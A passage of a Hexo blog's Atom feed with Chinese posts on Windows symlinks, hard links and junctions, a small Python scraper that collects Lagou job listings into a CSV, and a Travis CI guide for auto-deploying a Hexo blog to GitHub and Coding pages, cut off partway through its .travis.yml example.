getwallpaper(str(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><h2 id="多说的"><a href="#多说的" class="headerlink" title="多说的"></a>多说的</h2><p>里面我用了下本机的代理，懂的人自然懂，主要是因为直连下载确实有点慢。<br>另外自己懒，本来就是临时十多分钟写的一个脚本，就懒得加多线程了。</p><p>自己发了个无声视频，也就是对我讲解中的演示，需要的可以看这里<a href="https://www.bilibili.com/video/av46184510/" target="_blank" rel="noopener">https://www.bilibili.com/video/av46184510/</a></p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11eqgyz2cj20pt0gl0ts.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;好久没写东西了，随便水一篇文，也是比较简单的东西&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>windows中的软链接硬链接等</title>
    <link href="http://hacktech.cn/2018/09/21/windows-file-dir-link.html"/>
    <id>http://hacktech.cn/2018/09/21/windows-file-dir-link.html</id>
    <published>2018-09-20T23:55:11.000Z</published>
    <updated>2019-11-13T05:11:10.980Z</updated>
    
    <content type="html"><![CDATA[<p>学校嘛，有些时候还是得逆逆上网客户端啥的，并且学校的不少工作，这Windows的需求还是挺强的，之前Win10的体验并不是太好，不过时隔这么久，打算从7升级到10了，恰好系统也该换了。</p><p>首先是命令行的关注，在家里使用了太久的marjaro，逐渐转为开发，以前对windows的命令行不关注也变为关注了，PowerShell安装了scoop，可以一键安装不少工具了，但是有一个痛点就是，以前对用户目录不关注，但是linux用久了反而觉得用户目录好用挖，我想在在命令行下切到我快捷方式指向的目录，但是是不行的，然后了解了一下这方面，就像是linux下的软链接硬链接一样。</p><a id="more"></a><h2 id="使用PowerShell"><a href="#使用PowerShell" class="headerlink" title="使用PowerShell"></a>使用PowerShell</h2><h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> -ItemType SymbolicLink -Path C:\\image -Target C:\\source.txt</span><br></pre></td></tr></table></figure><h3 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> -ItemType HardLink -Path C:\\image.txt -Target C:\\source.txt</span><br></pre></td></tr></table></figure><h2 id="Junction"><a href="#Junction" class="headerlink" title="Junction"></a>Junction</h2><p>windows中文件与文件夹是完全不同的两种类型，创建文件夹链接不可以使用 <code>HardLink</code> ，但是可以使用 <code>Junction</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> -ItemType Junction -Path C:\\test\_image -Target C:\\test\_source</span><br></pre></td></tr></table></figure><p>虽然powershell可以建立，但是命令还是很繁琐，cmd下有个工具mklink</p><h2 id="使用CMD"><a href="#使用CMD" class="headerlink" title="使用CMD"></a>使用CMD</h2><p>cmd下有个好用的工具mklink</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\\&gt;mklink</span><br><span class="line"></span><br><span class="line">创建符号链接。</span><br><span class="line">MKLINK \[\[/D\] | \[/H\] |\[/J\]\] Link Target</span><br><span class="line">    /D 创建目录符号链接。默认为文件符号链接。</span><br><span class="line">    /H 创建硬链接而非符号链接。</span><br><span class="line">    /J 创建目录链接。</span><br><span class="line">    Link 指定新的符号链接名称。</span><br><span class="line">    Target 指定新链接引用的路径（绝对或相对）。</span><br></pre></td></tr></table></figure><h2 id="软链接和硬链接的区别"><a href="#软链接和硬链接的区别" class="headerlink" title="软链接和硬链接的区别"></a>软链接和硬链接的区别</h2><p>其实这部分和linux中的是差不多的</p><p><strong>符号(软)链接</strong>（Symbolic link）</p><ul><li>执行命令 mklink link_name target_name</li><li>创建链接后的图标和快捷方式很像</li><li>在系统中不占用空间</li><li>在文件系统中不是一个单独的文件</li><li>在操作系统层解析（！？）</li><li>如果源文件被删除了，链接就没用了</li><li>移除源文件不会影响符号链接</li><li>移除链接文件也不会影响源文件</li></ul><p><strong>硬链接</strong>（Hard link）</p><ul><li>执行命令 mklink /H link_name target_name</li><li>在系统中占用的空间与源文件相同，但在系统中引用的是相同的对象（不是拷贝）</li><li>在操作系统层解析（！？）</li><li>图标和创建快捷方式的图标不同</li><li>移除源文件不会影响硬链接</li><li>移除硬链接不会影响源文件</li><li>如果源文件被删除，它的内容依然通过硬链接存在</li><li>硬链接文件的任何更改都会影响到源文件</li></ul><h2 id="快捷方式有何不同"><a href="#快捷方式有何不同" class="headerlink" title="快捷方式有何不同"></a>快捷方式有何不同</h2><p>首先不说快捷方式占空间， 软链接不占空间，还有我觉得很重要的区别是快捷方式带后缀<code>.lnk</code>，是个文件，无法通过路径重定向到目标地址，反正我不太推荐这个，除非是建立到桌面方便鼠标点击的用户。</p><h2 id="软链接和Junction的区别"><a href="#软链接和Junction的区别" class="headerlink" title="软链接和Junction的区别"></a>软链接和Junction的区别</h2><p>可能你会疑惑 <code>mklink</code> 命令参数 <code>/D</code> 和 <code>/J</code> 的区别。这里我直接贴一段我查到的东西：</p><ol><li>创建 /d 可以使用相对路径方式创建 /j  必须绝对路径方式创建 此区别意义不大，建议所有的mklink目录均用绝对路径创建</li><li>复制和剪切 复制：/d /j 均生成源目录的内容副本，变为一般文件夹 剪切/移动：/d 生成的目录，移动到其他地方，仍旧保持链接。对源目录无影响，/d生成的目录消失  /j 生成的目录，移动到其他地方，会产生一个新的副本文件夹，源文件夹内容全部移至新普通文件夹内，源文件夹清空，源文件夹仍旧存在，/j生成的目录也依旧存在                                              </li><li><p>软件打开 用filedialog打开，/d生成的目录，地址栏会跳到源目录位置。                             /J生成的目录，地址栏不会跳到源目录位置。 用FolderDialog打开，两者相同。 </p><p>整体来说，/D更像一个快捷方式。</p></li></ol><p>符号链接（Symlink，Softlink）是对文件或目录的引用，实际上符号链接本身是一个“记录着所引用文件或目录的绝对或相对路径”的特殊文件，通过符号链接的操作都会被重定向到目标文件或目录。  </p><p>交接点（Junction），也称为“再分析点”，是 NTFS 3.0 及以上文件系统（Windows 2000 及以上系统）的特性，它是链接本地目录（可跨卷）的访问点，通过交接点的操作都会被系统映射到实际的目录上。通过建立交接点，可以在保证一个目录实例（目录的一致性）的前提下，允许用户或程序从本地文件系统中的多个位置访问此目录。<br>对符号链接和快捷方式的“读、写、遍历”等操作都会被重定向到目标文件或目录；但对它们的“复制、删除、移动、配置 ACL”等操作只针对自身；符号链接不但可以应用于本地系统，还可以应用 UNC 路径。  </p><p>对交接点内文件和子目录的“建立、删除、修改”等操作都被映射到对应的目录中的文件和子目录上；<br>对交接点的“复制、粘贴、剪切、配置 ACL”，只会影响此交接点；<br>在同一卷内移动交接点，只会影响此交接点；但在不同卷间移动交接点，会将此交接点转换为正常目录，并且交接点对应目录下的所有内容都会被移动；<br>通过“资源浏览器（Explorer.exe）”和“命令行 del”等工具删除交接点时，会同时删除对应目录下的所有内容（但不会删除目录）；可通过“linkd.exe /d”安全的删除交接点；但在 vista 及以后的系统中，对交接点的删除会被正确的处理。</p><p>你可以自己建立这两个后，在同卷和在不同卷间复制移动粘贴看看区别，就暂时我了解到的来说的话，我个人建议是使用<code>/D</code>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学校嘛，有些时候还是得逆逆上网客户端啥的，并且学校的不少工作，这Windows的需求还是挺强的，之前Win10的体验并不是太好，不过时隔这么久，打算从7升级到10了，恰好系统也该换了。&lt;/p&gt;
&lt;p&gt;首先是命令行的关注，在家里使用了太久的marjaro，逐渐转为开发，以前对windows的命令行不关注也变为关注了，PowerShell安装了scoop，可以一键安装不少工具了，但是有一个痛点就是，以前对用户目录不关注，但是linux用久了反而觉得用户目录好用挖，我想在在命令行下切到我快捷方式指向的目录，但是是不行的，然后了解了一下这方面，就像是linux下的软链接硬链接一样。&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="http://hacktech.cn/categories/Windows/"/>
    
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>拉勾抓职位简单小爬虫</title>
    <link href="http://hacktech.cn/2018/09/11/crawl-jos-on-lagou.html"/>
    <id>http://hacktech.cn/2018/09/11/crawl-jos-on-lagou.html</id>
    <published>2018-09-10T20:12:38.000Z</published>
    <updated>2019-11-13T05:11:10.976Z</updated>
    
    <content type="html"><![CDATA[<p>花了十来分钟写了个这个小爬虫，目的就是想能够方便一点寻找职位，并且大四了，没有工作和实习很慌啊！</p><a id="more"></a><p>爬虫不具有扩展性，自己随手写的，改掉里面的 <code>keyword</code> 和 <code>region</code> 即可爬行所有的招聘，刚开始测试的是5s访问一次，不过还是会被ban，所以改成了20s一次，没有使用多线程和代理池，懒，够用就行了，结果会保存到一个csv文件里面，用excel打开即可。</p><p>直接上代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    keyword = <span class="string">'逆向'</span></span><br><span class="line">    region = <span class="string">'全国'</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'application/json, text/javascript, */*; q=0.01'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, br'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">        <span class="string">'Cache-Control'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: <span class="string">'37'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">'www.lagou.com'</span>,</span><br><span class="line">        <span class="string">'Origin'</span>: <span class="string">'https://www.lagou.com'</span>,</span><br><span class="line">        <span class="string">'Pragma'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'https://www.lagou.com/jobs/list_%s?city=%s'</span> % (urllib.parse.quote(keyword), urllib.parse.quote(region)),</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'X-Anit-Forge-Code'</span>: <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'X-Anit-Forge-Token'</span>: <span class="string">'None'</span>,</span><br><span class="line">        <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'pn'</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">'kd'</span>: keyword,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    total_count = <span class="number">1</span></span><br><span class="line">    pn = <span class="number">1</span></span><br><span class="line">    jobjson = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> total_count &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data[<span class="string">'pn'</span>] = pn</span><br><span class="line">        lagou_reverse_search = requests.post(<span class="string">"https://www.lagou.com/jobs/positionAjax.json?needAddtionalResult=false"</span>, headers=headers, data=data)</span><br><span class="line">        datajson = json.loads(lagou_reverse_search.text)</span><br><span class="line">        print(<span class="string">'page %d get finish'</span> % pn)</span><br><span class="line">        <span class="keyword">if</span> pn == <span class="number">1</span>:</span><br><span class="line">            total_count = int(datajson[<span class="string">'content'</span>][<span class="string">'positionResult'</span>][<span class="string">'totalCount'</span>])</span><br><span class="line">        jobjson += [&#123;<span class="string">'positionName'</span>: j[<span class="string">'positionName'</span>], <span class="string">'salary'</span>: j[<span class="string">'salary'</span>], <span class="string">'workYear'</span>: j[<span class="string">'workYear'</span>], <span class="string">'education'</span>: j[<span class="string">'education'</span>], <span class="string">'city'</span>: j[<span class="string">'city'</span>], <span class="string">'industryField'</span>: j[<span class="string">'industryField'</span>], <span class="string">'companyShortName'</span>: j[<span class="string">'companyShortName'</span>], <span class="string">'financeStage'</span>: j[<span class="string">'financeStage'</span>]&#125; <span class="keyword">for</span> j <span class="keyword">in</span> datajson[<span class="string">'content'</span>][<span class="string">'positionResult'</span>][<span class="string">'result'</span>]]</span><br><span class="line">        total_count -= <span class="number">15</span></span><br><span class="line">        pn += <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">    csv_header = [<span class="string">'positionName'</span>, <span class="string">'salary'</span>, <span class="string">'workYear'</span>, <span class="string">'education'</span>, <span class="string">'city'</span>, <span class="string">'industryField'</span>, <span class="string">'companyShortName'</span>, <span class="string">'financeStage'</span>]</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'job.csv'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f_csv = csv.DictWriter(f, csv_header)</span><br><span class="line">        f_csv.writeheader()</span><br><span class="line">        f_csv.writerows(jobjson)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>ajax动态加载的，直接打开调试工具看XHR即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;花了十来分钟写了个这个小爬虫，目的就是想能够方便一点寻找职位，并且大四了，没有工作和实习很慌啊！&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>GTD利器Google Calendar与Hexo博客的结合</title>
    <link href="http://hacktech.cn/2018/09/08/GTD-google-calendar-with-hexo-next.html"/>
    <id>http://hacktech.cn/2018/09/08/GTD-google-calendar-with-hexo-next.html</id>
    <published>2018-09-07T18:44:25.000Z</published>
    <updated>2019-11-13T05:11:10.976Z</updated>
    
    <content type="html"><![CDATA[<p>等待 <code>hexo-theme-next</code> 主题官方仓库的合并。以后再写，先挖个坑。<br><a id="more"></a><br>等待 <code>hexo-theme-next</code> 主题官方仓库的合并。以后再写，先挖个坑。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;等待 &lt;code&gt;hexo-theme-next&lt;/code&gt; 主题官方仓库的合并。以后再写，先挖个坑。&lt;br&gt;
    
    </summary>
    
      <category term="blog" scheme="http://hacktech.cn/categories/blog/"/>
    
    
      <category term="blog" scheme="http://hacktech.cn/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>使用Travis CI自动部署博客到github pages和coding pages</title>
    <link href="http://hacktech.cn/2018/09/07/use-travis-ci-update-hexo-to-github-and-coding.html"/>
    <id>http://hacktech.cn/2018/09/07/use-travis-ci-update-hexo-to-github-and-coding.html</id>
    <published>2018-09-07T11:25:20.000Z</published>
    <updated>2019-11-13T05:11:10.980Z</updated>
    
    <content type="html"><![CDATA[<p>每次换系统或换电脑之后重新部署博客总是很苦恼？想像jekyll那样，一次性部署完成后，以后本地不用安装环境直接 <code>git push</code> 就能生成博客？那我推荐你应该使用使用 <code>Travis CI</code>了。</p><p>这篇文章我们来讲讲如何利用 <code>Travis CI</code>把你 <code>push</code> 上去的博客源文件直接生成可访问的站点，并且同步部署到 <code>github pages</code> 和 <code>coding pages</code> 。</p><p>这篇文章假设你已经对这些采用 <code>git</code> 版本控制系统的静态博客托管服务有所了解，并且知道怎么去简单的使用 <code>git</code> 以及了解 <code>hexo</code> 写博客发布到这些 <code>pages</code> 服务的流程。因此本文会写的较为<strong>简略，旨在指出关键的地方以及我遇到的问题、问题产生的原因和提供的解决方案</strong>，希望能够帮助到大家。</p><a id="more"></a><p>如果大家有什么问题可以直接在下方评论（独立博客采用Disqus，可能需要翻墙），或者直接给我邮件（<a href="mailto:akkuamns@qq.com" target="_blank" rel="noopener">akkuamns@qq.com</a>），我可能会在以后的时间逐步把详细的流程写出来，时间不多，匆忙之际下笔，望大家见谅。</p><p>看完上面的话，是不是有一种“复恐匆匆说不尽，行人临发又开封。”的感觉，可能废话太多了，那么直接开始吧！</p><h2 id="令牌的获取"><a href="#令牌的获取" class="headerlink" title="令牌的获取"></a>令牌的获取</h2><h3 id="问个为什么"><a href="#问个为什么" class="headerlink" title="问个为什么"></a>问个为什么</h3><p>首先我们说一下为什么要获取令牌？他的作用是什么？</p><p>先给大家几个流程图，来自于<a href="https://liolok.github.io/Hexo-Travis-CI/" target="_blank" rel="noopener">liolok的博客(前两张)</a>和<a href="http://magicse7en.github.io/2016/03/27/travis-ci-auto-deploy-hexo-github/" target="_blank" rel="noopener">CodingLife的博客(第三张)</a></p><p>首先是当我们未采用 <code>Travis CI</code> ，直接使用 <code>hexo</code> 的插件 <code>hexo-deployer-git</code> 执行命令 <code>hexo d -g</code> 部署的流程：</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv189l6c01j20xh0j9q4c.jpg" alt="liolok的博客-旧流程"></p><p>然后是使用 <code>Travis CI</code> 进行将仓库中的站点源文件自动生成站点然后部署到特定仓库(或特定分支)的流程：</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv18c106iaj219a0k3q4s.jpg" alt="liolok的博客-新流程"></p><p>还有一张图大家也可以看看：</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv18deh3foj20tx0sfafg.jpg" alt="TravisCI自动构建hexo博客流程图"></p><p>现在假设一种情况：我们把 <code>username/username.github.io</code> 仓库 <code>clone</code> 了下来，然后在它里面新建了一个分支 <code>hexo</code> 并放置我们的站点源文件（也就是你 <code>hexo init blog</code> 出来的 <code>blog</code> 目录下的所有文件），然后把这个 <code>hexo</code> 分支 <code>push</code> 了上去。</p><p>那么你设置这个仓库到 <code>Travis CI</code> 之后会做什么呢？它会寻找 <code>.travis.yml</code> 这个文件，如果存在的话，它就会根据 <code>.travis.yml</code> 来自动执行一些命令，这些命令就可以完成我们的需求。</p><p>然后我们回到刚才的话题，为什么要获取令牌？</p><p>令牌相当于一个通行证，比如要实现我们的需求，我们的 <code>.travis.yml</code> 中需要把 <code>hexo</code> 分支下的站点源文件文件使用 <code>hexo g</code> 生成静态站点后把这个静态站点 <code>push</code> 到我们的仓库，那 <code>github</code> 总不可能让人想 <code>push</code> 到谁的仓库就可以直接 <code>push</code> 上去吧，所以它就是靠这个通行证来验证你的身份。</p><p>所以我们把令牌的key字段加到 <code>Travis CI</code> 后就可以让 <code>github</code> 知道：哦，这个人是已授权的。</p><h3 id="那么怎么做"><a href="#那么怎么做" class="headerlink" title="那么怎么做"></a>那么怎么做</h3><p>那应该怎么去获取这个令牌并加到  <code>Travis CI</code> 呢？</p><p>哦哦，忘了说一个东西，如果你仔细看了我刚才的描述，那么你可能对这个  <code>Travis CI</code> 还是不了解，只是大致知道了他可以用来做什么，借用一下维基百科上的解释：</p><blockquote><p>Travis CI是在软件开发领域中的一个在线的，分布式的持续集成服务，用来构建及测试在GitHub托管的代码。</p></blockquote><p>你可以把它简单的认为是一个用来 <code>读取你的仓库 -&gt; 读取仓库下的 .travis.yml 文件 -&gt; 根据 .travis.yml 的内容对这个仓库来执行一系列linux和git命令去达到你的目的</code> 的工具。</p><p>那么谈到令牌的获取，这个并不麻烦。</p><p>如果是 <code>github</code>，登陆后打开设置，然后进入 <code>Developer settings -&gt;Personal access tokens</code> 点击 <code>Generate new token</code>，然后会提示你选择这个令牌拥有的权限，因为我们只需要对仓库进行操作，选中 <code>repo</code>即可。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv193cmo02j20sy0g1q46.jpg" alt=""></p><p>然后复制那一串 <code>token</code> 先保存下来。</p><p>如果是 <code>coding</code>，打开 <code>个人设置 -&gt; 访问令牌</code>，然后点击 <code>新建令牌</code>，同样的给予仓库的控制权限，然后复制保存生成的 <code>token</code> 。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv1978v3jhj20r80cj754.jpg" alt=""></p><p>然后打开<a href="https://travis-ci.org" target="_blank" rel="noopener">Travis CI</a> 网站，然后点击右上角的用github登录，然后同步你的仓库，再打开你需要自动部署的仓库开关，点击设置进去添加 <code>token</code> 即可。直接给两张图。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv19ce3p5xj20up0ieq4h.jpg" alt=""></p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv19fuupr5j21hc0u0ad1.jpg" alt=""></p><p>需要注意的是</p><ul><li>每个<code>Token</code> 自定义的 <code>Name</code> 你需要记住，待会在写 <code>.travis.yml</code> 的时候会用到</li><li><code>Display value in build log</code> 这个选项千万不要打开，因为log是公网可见的</li></ul><h2 id="仓库的结构"><a href="#仓库的结构" class="headerlink" title="仓库的结构"></a>仓库的结构</h2><p>上面完成了，我们来说说仓库的结构。</p><ol><li><p>你可以把站点源文件部署到一个新仓库（假如是 <code>new_repo</code>），那么你需要更改一下上面的设置，不是打开博客仓库的开关了，而是换成打开你需要操作的仓库 <code>new_repo</code>的开关，然后  <code>Travis CI</code> 再通过我们设置好的 <code>.travis.yml</code> 自动部署到博客仓库</p></li><li><p>你也可以把站点源文件部署到博客仓库（下文我以 <code>akkuman.github.io</code> 代替）的新分支，然后 <code>Travis CI</code> 再通过这个新分支下我们设置好的 <code>.travis.yml</code> 自动部署到博客仓库 <code>akkuman.github.io</code> 。</p></li></ol><p>这里我们采用第二种方案，只是个人爱好，不想再多开一个仓库。</p><h2 id="仓库的改造"><a href="#仓库的改造" class="headerlink" title="仓库的改造"></a>仓库的改造</h2><h3 id="新分支的建立"><a href="#新分支的建立" class="headerlink" title="新分支的建立"></a>新分支的建立</h3><p>直接看下面的命令和注释吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先把自己的博客仓库clone到本地</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:akkuman/akkuman.github.io.git</span><br><span class="line"><span class="built_in">cd</span> akkuman.github.io.git</span><br><span class="line"><span class="comment"># 我们假设仓库下的部署分支是master</span></span><br><span class="line"><span class="comment"># 我们先新建并切换到一个新分支，分支名我这里取为hexo</span></span><br><span class="line">git checkout -b hexo</span><br></pre></td></tr></table></figure><p>现在我们已经切换到了新分支 <code>hexo</code>，紧接着我们删除 <code>akkuman.github.io</code> 文件夹下除了 <code>.git</code> 文件夹的其他所有文件。</p><p>我们把其他地方 <code>hexo init blog</code> 出来的 <code>blog</code> 站点文件夹下所有文件复制到刚才的 <code>akkuman.github.io</code> 文件夹下。</p><h3 id="站点主题的处理"><a href="#站点主题的处理" class="headerlink" title="站点主题的处理"></a>站点主题的处理</h3><p>这里我们需要注意:<br>不知道你的主题是怎么下载来的，我就分为 1.主题是一个 <code>git</code> 仓库 2.主题不是一个 <code>git</code> 仓库，所以主题可能也是一个 <code>git</code> 仓库，如果你对 <code>git</code> 不熟悉，建议不要 <code>git clone</code> 主题仓库，而是下载别人的 <code>release</code> 版。</p><p>判断一个文件夹是不是 <code>git</code> 仓库，就是看该文件夹目录下有没有一个 <code>.git</code>文件夹，注意它是一个隐藏文件夹，所以你发现你的主题是一个 <code>git</code> 仓库的时候，你可以删除这个隐藏的 <code>.git</code>文件夹。</p><p>那么我们这么做的目的是什么呢？</p><p>如果我们的主题文件夹也是一个 <code>git</code> 仓库，那么我们的这个博客仓库的 <code>hexo</code> 分支下就嵌套了一个仓库，当然，<code>git</code> 也给出了解决方案，那就是子模块。所以目的就是告诉你：图省事可以直接使用非 <code>git</code> 仓库的主题，不用折腾子模块。</p><p>多说一点吧：</p><p>说到子模块，子模块是SSH协议还是HTTPS协议对后面有影响，不过我后面会给一个通用的模板，看后面的注释即可。</p><p>这个子模块你是使用SSH协议还是HTTPS协议就看个人爱好了，我是自己 <code>fork</code> 了别人的仓库然后修改了一下，所以我为了方便期间还是使用了SSH协议的仓库。</p><p>然后子模块怎么使用呢？</p><p>比如我使用的主题仓库是<a href="mailto:`git@github.com" target="_blank" rel="noopener">`git@github.com</a>:akkuman/hexo-theme-next.git<code>，现在假设我们在博客仓库</code>akkuman.github.io<code>下，然后执行下面命令把这个主题仓库下的所有文件复制到站点目录下的</code>themes/next` 文件夹下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule add git@github.com:akkuman/hexo-theme-next.git themes/next</span><br></pre></td></tr></table></figure><p>然后你的目录下会出现一个 <code>.gitmodules</code> 文件，内容格式大致是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[submodule &quot;themes/next&quot;]</span><br><span class="line">path = themes/next</span><br><span class="line">url = git@github.com:akkuman/hexo-theme-next.git</span><br></pre></td></tr></table></figure><p>关于子模块的知识可以自己查阅资料，我这里不细说了，待会在后面我会给出参考资料。</p><h3 id="git需要忽略的文件"><a href="#git需要忽略的文件" class="headerlink" title="git需要忽略的文件"></a>git需要忽略的文件</h3><p><code>git</code> 依靠 <code>.gitignore</code> 文件判断那些文件不纳入仓库，一般通过 <code>hexo init</code> 命令出来的站点文件夹下都会有这么个文件。没有也没关系，自己新建一个 <code>.gitignore</code> 文件，内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br></pre></td></tr></table></figure><blockquote><p>node_modules目录是hexo博客实例的npm环境依赖,，据说是质量比黑洞还大的物体， 我们选择忽略它， 反正最后到了Travis那里也会重新跑一遍npm install,，这些东西本来也会删了重来, 没有同步的意义.<br>public目录是hexo生成的静态文件， db.json是数据库文件,，同理,，由于Travis构建流程中会执行hexo clean,，都不需要同步。</p></blockquote><h3 id="travis-yml的设置"><a href="#travis-yml的设置" class="headerlink" title=".travis.yml的设置"></a>.travis.yml的设置</h3><p>上面的操作完成后，我们开始着手写 <code>.travis.yml</code>了，先提供一个最简单也是网上博客教程里面最多的版本</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span> <span class="comment"># 设置语言</span></span><br><span class="line"><span class="attr">node_js:</span> <span class="string">stable</span> <span class="comment"># 